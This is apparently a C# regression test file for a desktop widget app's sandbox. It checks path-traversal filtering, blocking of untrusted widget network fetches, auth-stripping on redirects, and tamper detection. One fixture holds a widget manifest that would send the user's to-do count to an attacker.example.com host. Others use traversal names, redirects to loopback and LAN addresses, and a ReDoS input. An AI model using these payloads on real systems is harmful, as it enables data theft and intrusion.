using System.Net;
using System.Text;
using DeskBox.FileSafety;
using DeskBox.Models;
using DeskBox.Services;
using DeskBox.Services.Studio;
using DeskBox.ViewModels;

namespace DeskBox.Tests;

public sealed class CustomWidgetSandboxAndLifecycleRegressionTests
{
    [Fact]
    public void GetSafeWidgetFileName_BlocksTraversalAndReservedDeviceNames_AndProtectsParentDataDirectory()
    {
        string dot = CustomWidgetDataStore.GetSafeWidgetFileName(".");
        string dotDot = CustomWidgetDataStore.GetSafeWidgetFileName("..");
        string con = CustomWidgetDataStore.GetSafeWidgetFileName("CON.txt");
        string nul = CustomWidgetDataStore.GetSafeWidgetFileName("NUL");
        string glanceDotDot = GlanceWidgetStore.GetSafeWidgetFileName("..");

        Assert.StartsWith("invalid_", dot, StringComparison.Ordinal);
        Assert.StartsWith("invalid_", dotDot, StringComparison.Ordinal);
        Assert.StartsWith("invalid_", con, StringComparison.Ordinal);
        Assert.StartsWith("invalid_", nul, StringComparison.Ordinal);
        Assert.StartsWith("invalid_", glanceDotDot, StringComparison.Ordinal);
        Assert.DoesNotContain("..", dotDot, StringComparison.Ordinal);

        string tempRoot = Path.Combine(Path.GetTempPath(), "deskbox-safe-id-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(tempRoot);
        try
        {
            string sentinelPath = Path.Combine(tempRoot, "settings.json");
            File.WriteAllText(sentinelPath, "{\"preserved\":true}", Encoding.UTF8);

            var traversalStore = new CustomWidgetDataStore("..", tempRoot);
            string expectedSubroot = Path.GetFullPath(Path.Combine(tempRoot, CustomWidgetDataStore.SubdirectoryName)) + Path.DirectorySeparatorChar;
            string actualWidgetDir = Path.GetFullPath(traversalStore.WidgetDirectory);

            Assert.StartsWith(expectedSubroot, actualWidgetDir, StringComparison.OrdinalIgnoreCase);
            Assert.True(File.Exists(sentinelPath));
        }
        finally
        {
            try { Directory.Delete(tempRoot, recursive: true); } catch { }
        }
    }

    [Fact]
    public async Task EnsureCommunityExternalTargetApprovedAsync_BlocksSpoofedLocalOrigin_AndStagePreviews()
    {
        string tempRoot = Path.Combine(Path.GetTempPath(), "deskbox-net-trust-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(tempRoot);
        try
        {
            const string spoofedLocalManifest = """
            {
              "schemaVersion": 1,
              "id": "spoofed.external.widget",
              "name": "Spoofed Local",
              "origin": "local",
              "sources": [
                {
                  "id": "feed",
                  "type": "httpJson",
                  "url": "https://attacker.example.com/collect?todo=${$todo.pendingCount}",
                  "collection": "items"
                }
              ],
              "collections": { "items": [] },
              "root": "main",
              "elements": {
                "main": { "type": "Text", "text": "Hello" }
              }
            }
            """;

            var settingsService = new SettingsService(Path.Combine(tempRoot, "settings.json"));
            var localization = new LocalizationService(settingsService);
            var store = new CustomWidgetDataStore("untrusted-import-1", tempRoot);
            await store.WriteManifestJsonAsync(spoofedLocalManifest);

            var trustStore = new CustomWidgetTrustStore(tempRoot);
            trustStore.RegisterWidgetProvenance("untrusted-import-1", trustedLocalAuthoring: false);

            int outboundCalls = 0;
            var netEngine = new CustomWidgetNetworkSourceEngine(
                Path.Combine(tempRoot, "net-cache"),
                new StubRedirectInnerHandler((_, _) =>
                {
                    Interlocked.Increment(ref outboundCalls);
                    return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK)
                    {
                        Content = new StringContent("[]", Encoding.UTF8, "application/json")
                    });
                }),
                dnsResolver: (_, _) => Task.FromResult(new[] { IPAddress.Parse("93.184.216.34") }));

            using var untrustedVm = new CustomWidgetViewModel(
                new WidgetConfig { Id = "untrusted-import-1", Name = "Untrusted", WidgetKind = WidgetKind.Custom },
                localization,
                store: store,
                dispatcherQueue: null,
                notificationServiceProvider: null,
                isPreviewOnly: false,
                networkSourceEngine: netEngine)
            {
                TrustStoreOverride = trustStore
            };

            await untrustedVm.InitializeAsync();
            bool approvedUntrusted = await untrustedVm.EnsureCommunityExternalTargetApprovedAsync(
                "network.fetch",
                "host:attacker.example.com",
                "https://attacker.example.com");
            Assert.False(approvedUntrusted);
            Assert.Equal(0, outboundCalls);

            // Even if provenance is marked trusted, uncommitted stage previews must NEVER fire outbound network requests.
            trustStore.RegisterWidgetProvenance("untrusted-import-1", trustedLocalAuthoring: true);
            untrustedVm.IsUntrustedStagePreview = true;

            bool approvedStagePreview = await untrustedVm.EnsureCommunityExternalTargetApprovedAsync(
                "network.fetch",
                "host:attacker.example.com",
                "https://attacker.example.com");
            Assert.False(approvedStagePreview);

            bool fetchedInStagePreview = await untrustedVm.RefreshNetworkSourcesNowAsync();
            Assert.False(fetchedInStagePreview);
            Assert.Equal(0, outboundCalls);
        }
        finally
        {
            try { Directory.Delete(tempRoot, recursive: true); } catch { }
        }
    }

    [Fact]
    public void CanonicalManifestAstWalkers_CoverSplitViewPane_Menus_PointerSlots_AndAiRunPermission()
    {
        const string manifestJson = """
        {
          "schemaVersion": 1,
          "id": "ast.walker.coverage",
          "name": "AST Coverage",
          "root": "main",
          "elements": {
            "main": {
              "type": "SplitView",
              "pane": "paneBtn",
              "children": ["menuBtn"]
            },
            "paneBtn": {
              "type": "Button",
              "id": "paneBtn",
              "text": "Mutate",
              "contextMenu": [
                {
                  "label": "Webhook",
                  "onClick": [
                    { "type": "http.request", "method": "POST", "url": "https://api.example.com/hook" }
                  ]
                }
              ]
            },
            "menuBtn": {
              "type": "Button",
              "id": "menuBtn",
              "text": "Menu",
              "menuItems": [
                {
                  "label": "Ask AI",
                  "onClick": [
                    { "type": "ai.run", "prompt": "Summarize" }
                  ]
                }
              ],
              "onPointerDown": [
                { "type": "state.set", "key": "pressed", "value": "1" }
              ]
            }
          },
          "state": { "pressed": "0" }
        }
        """;

        CustomWidgetParseResult parsed = CustomWidgetManifestParser.Parse(manifestJson);
        Assert.NotNull(parsed.Manifest);
        CustomWidgetManifest manifest = parsed.Manifest!;

        List<string> visitedIds = manifest.EnumerateAllNodes()
            .Where(static n => !string.IsNullOrEmpty(n.Id))
            .Select(static n => n.Id!)
            .ToList();
        Assert.Contains("paneBtn", visitedIds);
        Assert.Contains("menuBtn", visitedIds);

        List<string> actionTypes = manifest.EnumerateAllActions()
            .Select(static a => a.Type)
            .ToList();
        Assert.Contains("http.request", actionTypes);
        Assert.Contains("ai.run", actionTypes);
        Assert.Contains("state.set", actionTypes);

        Assert.True(CustomWidgetTrustStore.ManifestUsesMutatingPublicNetwork(manifest));
        IReadOnlySet<CustomWidgetPermissionKind> perms = CustomWidgetTrustStore.DetectRequestedPermissions(manifest);
        Assert.Contains(CustomWidgetPermissionKind.PublicNetwork, perms);
    }

    [Fact]
    public async Task SameOriginAuthSafeRedirectHandler_BlocksCrossOriginRedirectsFromPublicHostToLoopbackAndPrivateLan()
    {
        int requestsSent = 0;
        var inner = new StubRedirectInnerHandler((req, _) =>
        {
            Interlocked.Increment(ref requestsSent);
            if (req.RequestUri!.AbsolutePath == "/v1/to-loopback")
            {
                var r = new HttpResponseMessage(HttpStatusCode.TemporaryRedirect);
                r.Headers.Location = new Uri("http://127.0.0.1:11434/api/tags");
                return Task.FromResult(r);
            }

            if (req.RequestUri.AbsolutePath == "/v1/to-lan")
            {
                var r = new HttpResponseMessage(HttpStatusCode.Found);
                r.Headers.Location = new Uri("https://192.168.1.25/internal");
                return Task.FromResult(r);
            }

            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK));
        });

        using var client = new HttpClient(new DeskBoxAiService.SameOriginAuthSafeRedirectHandler(inner));

        using HttpResponseMessage loopbackResp = await client.PostAsync(
            "https://relay.example.com/v1/to-loopback",
            new StringContent("{}", Encoding.UTF8, "application/json"));
        Assert.Equal(HttpStatusCode.TemporaryRedirect, loopbackResp.StatusCode);
        Assert.Equal(1, requestsSent);

        requestsSent = 0;
        using HttpResponseMessage lanResp = await client.GetAsync("https://relay.example.com/v1/to-lan");
        Assert.Equal(HttpStatusCode.Found, lanResp.StatusCode);
        Assert.Equal(1, requestsSent);
    }

    [Fact]
    public void AgentStageStore_TryGetCommitted_VerifiesExpectedManifestHashes()
    {
        string tempStageDir = Path.Combine(Path.GetTempPath(), "deskbox-stage-tamper-" + Guid.NewGuid().ToString("N"));
        string prevOverride = CustomWidgetAgentStageStore.RootOverride;
        try
        {
            CustomWidgetAgentStageStore.RootOverride = tempStageDir;
            const string manifestA = """{"schemaVersion":1,"id":"demo.a","name":"Demo A","root":"main","elements":{"main":{"type":"Text","text":"A"}}}""";
            const string manifestB = """{"schemaVersion":1,"id":"demo.a","name":"Demo B","root":"main","elements":{"main":{"type":"Text","text":"B"}}}""";

            string stageId = CustomWidgetAgentStageStore.Stage(new AgentStageRequest(
                WidgetId: "w-1",
                ManifestJson: manifestA,
                LogicJs: null,
                HasLogicJs: false,
                LocalesJson: null,
                HasLocales: false,
                ResizeToDefault: false,
                RawCallerManifestJson: manifestA));

            bool consumed = CustomWidgetAgentStageStore.TryConsumeBundle(
                stageId,
                manifestA,
                hasCallerLogicJs: false,
                callerLogicJs: null,
                hasCallerLocales: false,
                callerLocalesJson: null,
                out AgentStageBundle? consumedBundle,
                out string error);
            Assert.True(consumed, error);
            Assert.Equal("w-1", consumedBundle?.WidgetId);

            CustomWidgetAgentStageStore.CompleteCommit(stageId);
            CustomWidgetAgentStageStore.RecordCommitted(stageId, "w-1");

            Assert.True(CustomWidgetAgentStageStore.TryGetCommitted(stageId, out string? committedId, manifestA));
            Assert.Equal("w-1", committedId);

            Assert.False(CustomWidgetAgentStageStore.TryGetCommitted(stageId, out string? tamperedId, manifestB));
            Assert.Null(tamperedId);
        }
        finally
        {
            CustomWidgetAgentStageStore.RootOverride = prevOverride;
            try { Directory.Delete(tempStageDir, recursive: true); } catch { }
        }
    }

    [Fact]
    public async Task StudioPreFlightProbeService_AdversarialDottedHostInput_CompletesInLinearTime()
    {
        string adversarialHost = string.Concat(Enumerable.Repeat("a.", 4_000)) + "1";
        string adversarialJs = $"export function onInit(ctx) {{ const u = 'https://{adversarialHost}'; }}";
        string manifestJson = $$"""
        {
          "schemaVersion": 1,
          "id": "probe.redos",
          "name": "Probe ReDoS",
          "sources": [
            { "id": "s1", "type": "httpJson", "url": "https://{{adversarialHost}}/feed", "collection": "items" }
          ],
          "collections": { "items": [] },
          "root": "main",
          "elements": {
            "main": { "type": "Text", "text": "Hi" }
          }
        }
        """;

        CustomWidgetManifest manifest = CustomWidgetManifestParser.Parse(manifestJson).Manifest!;
        var failedHosts = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["example.com"] = "unreachable"
        };
        var probeSvc = new StudioPreFlightProbeService(networkSourceEngine: null);

        // Warm up once
        _ = await probeSvc.BuildNetworkProbeFeedbackAsync(manifest, CancellationToken.None, "const x = 1;", failedHosts);

        var sw = System.Diagnostics.Stopwatch.StartNew();
        _ = await probeSvc.BuildNetworkProbeFeedbackAsync(manifest, CancellationToken.None, adversarialJs, failedHosts);
        sw.Stop();

        Assert.True(sw.ElapsedMilliseconds < 250, $"Expected linear-time host regex (< 250ms), took {sw.ElapsedMilliseconds}ms.");
    }

    [Fact]
    public void StudioDraftRecovery_PreservesExternalImportProvenance_AndDismissBannerRetainsChatHistory()
    {
        string tempDir = Path.Combine(Path.GetTempPath(), "deskbox-studio-prov-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(tempDir);
        try
        {
            var settingsService = new SettingsService(Path.Combine(tempDir, "settings.json"));
            var loc = new LocalizationService(settingsService);
            var prefs = new CustomWidgetStudioPreferencesStore(Path.Combine(tempDir, "studio-prefs.json"));
            var sessionStore = new CustomWidgetStudioSessionStore(Path.Combine(tempDir, "sessions"));

            var authorSession = new StudioSessionController(loc, NullStudioHostBridge.Instance, prefs, sessionStore)
            {
                IsExternalImportSession = true
            };

            const string importedCommunityManifest = """
            {
              "schemaVersion": 1,
              "id": "community.weather.card",
              "name": "Community Card",
              "origin": "community",
              "root": "main",
              "elements": {
                "main": { "type": "Text", "text": "v1" }
              }
            }
            """;
            const string aiRefinedManifestOmittedOrigin = """
            {
              "schemaVersion": 1,
              "id": "community.weather.card",
              "name": "Community Card V2",
              "root": "main",
              "elements": {
                "main": { "type": "Text", "text": "v2" }
              }
            }
            """;

            authorSession.AddRevision(importedCommunityManifest, "Imported", isAiChange: false, source: "import", isCommitted: false, markDirty: true);
            authorSession.AddRevision(aiRefinedManifestOmittedOrigin, "AI refined", isAiChange: true, source: "ai", isCommitted: false, markDirty: true);
            authorSession.PersistActiveDraftIfDirty();

            StudioDraftSnapshot? savedDraft = sessionStore.TryLoadCreateDraft();
            Assert.NotNull(savedDraft);
            Assert.True(savedDraft!.IsExternalImportSession);

            var recoveredSession = new StudioSessionController(loc, NullStudioHostBridge.Instance, prefs, sessionStore);
            Assert.True(recoveredSession.RestoreDraftState(savedDraft));
            Assert.True(recoveredSession.IsExternalImportSession);

            string stampedCommitJson = recoveredSession.StampManifestProvenanceForCommit(aiRefinedManifestOmittedOrigin);
            CustomWidgetManifest stampedManifest = CustomWidgetManifestParser.Parse(stampedCommitJson).Manifest!;
            Assert.Equal(CustomWidgetOriginKinds.Community, stampedManifest.Origin);

            // Dismissing a pending recovery banner on an existing widget must NOT wipe committed ChatMessages
            var editSession = new StudioSessionController(loc, NullStudioHostBridge.Instance, prefs, sessionStore)
            {
                TargetWidgetId = "existing-widget-1",
                PendingRecoveryDraft = savedDraft
            };
            editSession.ChatMessages.Add(new StudioChatMessage
            {
                Id = "msg-1",
                Role = "assistant",
                Kind = "edit",
                Text = "Committed chat message"
            });

            editSession.DismissPendingRecoveryDraft();
            Assert.Null(editSession.PendingRecoveryDraft);
            Assert.Single(editSession.ChatMessages);
        }
        finally
        {
            try { Directory.Delete(tempDir, recursive: true); } catch { }
        }
    }

    [Fact]
    public async Task DisposedViewModel_InitializeAsync_ExitsCleanlyWithoutStartingSubscriptions()
    {
        string tempRoot = Path.Combine(Path.GetTempPath(), "deskbox-disposed-init-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(tempRoot);
        try
        {
            var settingsService = new SettingsService(Path.Combine(tempRoot, "settings.json"));
            var localization = new LocalizationService(settingsService);
            var store = new CustomWidgetDataStore("disposed-vm-1", tempRoot);

            var vm = new CustomWidgetViewModel(
                new WidgetConfig { Id = "disposed-vm-1", Name = "Disposed", WidgetKind = WidgetKind.Custom },
                localization,
                store: store,
                dispatcherQueue: null,
                notificationServiceProvider: null,
                isPreviewOnly: false);

            vm.Dispose();
            await vm.InitializeAsync();

            Assert.True(vm.IsDisposedInternal);
            Assert.False(vm.IsInitializedInternal);
        }
        finally
        {
            try { Directory.Delete(tempRoot, recursive: true); } catch { }
        }
    }

    [Fact]
    public async Task SameOriginAuthSafeRedirectHandler_MultiHopCrossOriginBounce_NeverReattachesAuthOrBody()
    {
        var capturedHops = new List<(Uri Uri, HttpMethod Method, bool HasAuth, bool HasApiKey, bool HasBody)>();
        var inner = new StubRedirectInnerHandler((req, _) =>
        {
            capturedHops.Add((
                req.RequestUri!,
                req.Method,
                req.Headers.Authorization is not null,
                req.Headers.Contains("x-api-key"),
                req.Content is not null));

            if (capturedHops.Count == 1)
            {
                var r1 = new HttpResponseMessage(HttpStatusCode.TemporaryRedirect);
                r1.Headers.Location = new Uri("https://cdn.other-origin.example/hop1");
                return Task.FromResult(r1);
            }

            if (capturedHops.Count == 2)
            {
                var r2 = new HttpResponseMessage(HttpStatusCode.TemporaryRedirect);
                r2.Headers.Location = new Uri("https://api.initial-origin.example/v1/echo");
                return Task.FromResult(r2);
            }

            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK));
        });

        using var client = new HttpClient(new DeskBoxAiService.SameOriginAuthSafeRedirectHandler(inner));
        using var reqMsg = new HttpRequestMessage(HttpMethod.Post, "https://api.initial-origin.example/v1/chat")
        {
            Content = new StringContent("{\"secret\":true}", Encoding.UTF8, "application/json")
        };
        reqMsg.Headers.TryAddWithoutValidation("Authorization", "Bearer sk-test-secret");
        reqMsg.Headers.TryAddWithoutValidation("x-api-key", "sk-test-secret");

        using HttpResponseMessage finalResp = await client.SendAsync(reqMsg);
        Assert.Equal(HttpStatusCode.OK, finalResp.StatusCode);
        Assert.Equal(3, capturedHops.Count);

        Assert.True(capturedHops[0].HasAuth);
        Assert.True(capturedHops[0].HasApiKey);
        Assert.Equal(HttpMethod.Post, capturedHops[0].Method);

        // Hop 1 (cross-origin) and Hop 2 (bounced back to initial origin) must both stay stripped and downgraded to GET.
        Assert.False(capturedHops[1].HasAuth);
        Assert.False(capturedHops[1].HasApiKey);
        Assert.False(capturedHops[1].HasBody);
        Assert.Equal(HttpMethod.Get, capturedHops[1].Method);

        Assert.False(capturedHops[2].HasAuth);
        Assert.False(capturedHops[2].HasApiKey);
        Assert.False(capturedHops[2].HasBody);
        Assert.Equal(HttpMethod.Get, capturedHops[2].Method);
    }

    [Fact]
    public void AgentStageStore_TryGetCommitted_SupportsScriptedAndLocalizedBundlesAndRejectsTampering()
    {
        string tempStageDir = Path.Combine(Path.GetTempPath(), "deskbox-stage-script-" + Guid.NewGuid().ToString("N"));
        string prevOverride = CustomWidgetAgentStageStore.RootOverride;
        try
        {
            CustomWidgetAgentStageStore.RootOverride = tempStageDir;
            const string rawCallerManifest = """{"schemaVersion":1,"id":"demo.script","name":"Raw","script":"logic.js","root":"main","elements":{"main":{"type":"Text","text":"A"}}}""";
            const string patchedStagedManifest = """{"schemaVersion":1,"id":"demo.script","name":"Patched","script":"logic.js","root":"main","elements":{"main":{"type":"Text","text":"A"}}}""";
            const string logicV1 = "export function onInit(ctx) { ctx.state.set('k', '1'); }";
            const string logicTampered = "export function onInit(ctx) { ctx.state.set('k', 'evil'); }";
            const string localesV1 = """{"zh-CN":{"title":"标题"}}""";
            const string localesTampered = """{"zh-CN":{"title":"篡改"}}""";

            string stageId = CustomWidgetAgentStageStore.Stage(new AgentStageRequest(
                WidgetId: "w-script-1",
                ManifestJson: patchedStagedManifest,
                LogicJs: logicV1,
                HasLogicJs: true,
                LocalesJson: localesV1,
                HasLocales: true,
                ResizeToDefault: false,
                RawCallerManifestJson: rawCallerManifest));

            Assert.True(CustomWidgetAgentStageStore.PreviewMatchesCallerManifest(stageId, rawCallerManifest));
            Assert.True(CustomWidgetAgentStageStore.PreviewMatchesCallerManifest(stageId, patchedStagedManifest));

            bool consumed = CustomWidgetAgentStageStore.TryConsumeBundle(
                stageId,
                rawCallerManifest,
                hasCallerLogicJs: true,
                callerLogicJs: logicV1,
                hasCallerLocales: true,
                callerLocalesJson: localesV1,
                out AgentStageBundle? bundle,
                out string error);
            Assert.True(consumed, error);
            Assert.NotNull(bundle);
            Assert.Equal(patchedStagedManifest, bundle!.ManifestJson);

            CustomWidgetAgentStageStore.RecordCommitted(stageId, "w-script-final");

            // Idempotent retry omitting manifest/logic/locales (stage_commit style)
            Assert.True(CustomWidgetAgentStageStore.TryGetCommitted(stageId, out string? id1));
            Assert.Equal("w-script-final", id1);

            // Idempotent retry resending matching rawCallerManifest + logicJs + locales
            Assert.True(CustomWidgetAgentStageStore.TryGetCommitted(
                stageId,
                out string? id2,
                rawCallerManifest,
                hasCallerLogicJs: true,
                callerLogicJs: logicV1,
                hasCallerLocales: true,
                callerLocalesJson: localesV1));
            Assert.Equal("w-script-final", id2);

            // Tampered logicJs or locales must be rejected
            Assert.False(CustomWidgetAgentStageStore.TryGetCommitted(
                stageId,
                out _,
                rawCallerManifest,
                hasCallerLogicJs: true,
                callerLogicJs: logicTampered,
                hasCallerLocales: true,
                callerLocalesJson: localesV1));
            Assert.False(CustomWidgetAgentStageStore.TryGetCommitted(
                stageId,
                out _,
                rawCallerManifest,
                hasCallerLogicJs: true,
                callerLogicJs: logicV1,
                hasCallerLocales: true,
                callerLocalesJson: localesTampered));
        }
        finally
        {
            CustomWidgetAgentStageStore.RootOverride = prevOverride;
            try { Directory.Delete(tempStageDir, recursive: true); } catch { }
        }
    }

    [Fact]
    public void StudioSessionStore_GetWidgetDirectory_AlignsWithCustomWidgetDataStoreSafeFileName()
    {
        string tempRoot = Path.Combine(Path.GetTempPath(), "deskbox-session-align-" + Guid.NewGuid().ToString("N"));
        try
        {
            var sessionStore = new CustomWidgetStudioSessionStore(tempRoot);
            foreach (string rawId in new[] { "CON", "NUL.json", "..", "  my-widget.v1  ", "中文组件_id" })
            {
                string sessionFolder = Path.GetFileName(sessionStore.GetWidgetDirectory(rawId));
                string dataFolder = CustomWidgetDataStore.GetSafeWidgetFileName(rawId);
                Assert.Equal(dataFolder, sessionFolder);
            }
        }
        finally
        {
            try { Directory.Delete(tempRoot, recursive: true); } catch { }
        }
    }

    private sealed class StubRedirectInnerHandler(
        Func<HttpRequestMessage, CancellationToken, Task<HttpResponseMessage>> handler) : HttpMessageHandler
    {
        protected override Task<HttpResponseMessage> SendAsync(
            HttpRequestMessage request,
            CancellationToken cancellationToken) =>
            handler(request, cancellationToken);
    }
}
